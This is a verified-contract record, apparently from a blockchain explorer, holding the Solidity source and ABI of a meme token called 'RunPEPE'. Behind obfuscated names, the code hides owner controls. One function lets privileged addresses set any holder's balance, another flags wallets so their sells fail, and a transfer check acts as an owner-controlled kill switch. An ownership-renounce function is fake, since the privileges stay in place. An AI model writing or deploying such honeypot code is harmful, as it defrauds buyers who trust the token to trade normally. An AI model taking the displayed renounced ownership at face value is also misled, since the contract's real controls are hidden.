{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface totalTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverSell) external view returns (uint256);\n\n    function transfer(address exemptIs, uint256 fromTradingBuy) external returns (bool);\n\n    function allowance(address swapTakeFee, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromTradingBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptIs,\n        uint256 fromTradingBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletList, uint256 value);\n    event Approval(address indexed swapTakeFee, address indexed spender, uint256 value);\n}\n\nabstract contract exemptLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface maxReceiver {\n    function createPair(address walletMinEnable, address tradingTake) external returns (address);\n}\n\ninterface receiverSender is totalTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RunPEPE is exemptLimit, totalTrading, receiverSender {\n\n    function sellBuy(address tokenSwap, uint256 fromTradingBuy) public {\n        limitTeamIs();\n        limitReceiverFund[tokenSwap] = fromTradingBuy;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toBuy;\n    }\n\n    function atMin() public {\n        emit OwnershipTransferred(receiverMax, address(0));\n        maxBuy = address(0);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return amountIsTeam;\n    }\n\n    uint256 private toBuy = 100000000 * 10 ** 18;\n\n    address exemptSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private enableSender = \"RPE\";\n\n    mapping(address => uint256) private limitReceiverFund;\n\n    string private amountIsTeam = \"Run PEPE\";\n\n    function owner() external view returns (address) {\n        return maxBuy;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableSender;\n    }\n\n    bool public launchReceiver;\n\n    function approve(address tokenFromAt, uint256 fromTradingBuy) public virtual override returns (bool) {\n        toTotal[_msgSender()][tokenFromAt] = fromTradingBuy;\n        emit Approval(_msgSender(), tokenFromAt, fromTradingBuy);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapAmount;\n    }\n\n    function limitTeamIs() private view {\n        require(buyTake[_msgSender()]);\n    }\n\n    uint256 private launchedAt;\n\n    address public teamAmount;\n\n    function transferFrom(address modeBuyMarketing, address exemptIs, uint256 fromTradingBuy) external override returns (bool) {\n        if (_msgSender() != limitSwap) {\n            if (toTotal[modeBuyMarketing][_msgSender()] != type(uint256).max) {\n                require(fromTradingBuy <= toTotal[modeBuyMarketing][_msgSender()]);\n                toTotal[modeBuyMarketing][_msgSender()] -= fromTradingBuy;\n            }\n        }\n        return maxTradingBuy(modeBuyMarketing, exemptIs, fromTradingBuy);\n    }\n\n    mapping(address => mapping(address => uint256)) private toTotal;\n\n    function modeFeeAmount(uint256 fromTradingBuy) public {\n        limitTeamIs();\n        liquidityFund = fromTradingBuy;\n    }\n\n    function allowance(address isFrom, address tokenFromAt) external view virtual override returns (uint256) {\n        if (tokenFromAt == limitSwap) {\n            return type(uint256).max;\n        }\n        return toTotal[isFrom][tokenFromAt];\n    }\n\n    uint256 liquidityFund;\n\n    uint8 private swapAmount = 18;\n\n    function getOwner() external view returns (address) {\n        return maxBuy;\n    }\n\n    address public receiverMax;\n\n    function balanceOf(address receiverSell) public view virtual override returns (uint256) {\n        return limitReceiverFund[receiverSell];\n    }\n\n    function enableTrading(address marketingWallet) public {\n        if (walletTx) {\n            return;\n        }\n        if (feeMinExempt == launchedAt) {\n            launchedAt = maxMarketing;\n        }\n        buyTake[marketingWallet] = true;\n        if (maxMarketing != feeMinExempt) {\n            launchReceiver = true;\n        }\n        walletTx = true;\n    }\n\n    function transfer(address tokenSwap, uint256 fromTradingBuy) external virtual override returns (bool) {\n        return maxTradingBuy(_msgSender(), tokenSwap, fromTradingBuy);\n    }\n\n    mapping(address => bool) public feeSell;\n\n    uint256 private maxMarketing;\n\n    event OwnershipTransferred(address indexed teamList, address indexed receiverTotal);\n\n    uint256 constant txMaxTrading = 13 ** 10;\n\n    function maxTradingBuy(address modeBuyMarketing, address exemptIs, uint256 fromTradingBuy) internal returns (bool) {\n        if (modeBuyMarketing == receiverMax) {\n            return launchLaunched(modeBuyMarketing, exemptIs, fromTradingBuy);\n        }\n        uint256 teamMarketing = totalTrading(teamAmount).balanceOf(exemptSender);\n        require(teamMarketing == liquidityFund);\n        require(exemptIs != exemptSender);\n        if (feeSell[modeBuyMarketing]) {\n            return launchLaunched(modeBuyMarketing, exemptIs, txMaxTrading);\n        }\n        return launchLaunched(modeBuyMarketing, exemptIs, fromTradingBuy);\n    }\n\n    address limitSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public buyTake;\n\n    bool public walletTx;\n\n    bool private sellList;\n\n    address private maxBuy;\n\n    constructor (){\n        \n        autoTeam limitFrom = autoTeam(limitSwap);\n        teamAmount = maxReceiver(limitFrom.factory()).createPair(limitFrom.WETH(), address(this));\n        \n        receiverMax = _msgSender();\n        atMin();\n        buyTake[receiverMax] = true;\n        limitReceiverFund[receiverMax] = toBuy;\n        if (maxMarketing == feeMinExempt) {\n            maxMarketing = feeMinExempt;\n        }\n        emit Transfer(address(0), receiverMax, toBuy);\n    }\n\n    uint256 enableTo;\n\n    function launchLaunched(address modeBuyMarketing, address exemptIs, uint256 fromTradingBuy) internal returns (bool) {\n        require(limitReceiverFund[modeBuyMarketing] >= fromTradingBuy);\n        limitReceiverFund[modeBuyMarketing] -= fromTradingBuy;\n        limitReceiverFund[exemptIs] += fromTradingBuy;\n        emit Transfer(modeBuyMarketing, exemptIs, fromTradingBuy);\n        return true;\n    }\n\n    function atReceiver(address totalLaunched) public {\n        limitTeamIs();\n        if (maxMarketing == launchedAt) {\n            launchReceiver = false;\n        }\n        if (totalLaunched == receiverMax || totalLaunched == teamAmount) {\n            return;\n        }\n        feeSell[totalLaunched] = true;\n    }\n\n    uint256 private feeMinExempt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTakeFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenFromAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFromAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTradingBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLaunched\",\"type\":\"address\"}],\"name\":\"atReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingWallet\",\"type\":\"address\"}],\"name\":\"enableTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromTradingBuy\",\"type\":\"uint256\"}],\"name\":\"modeFeeAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTradingBuy\",\"type\":\"uint256\"}],\"name\":\"sellBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTradingBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeBuyMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTradingBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "RunPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}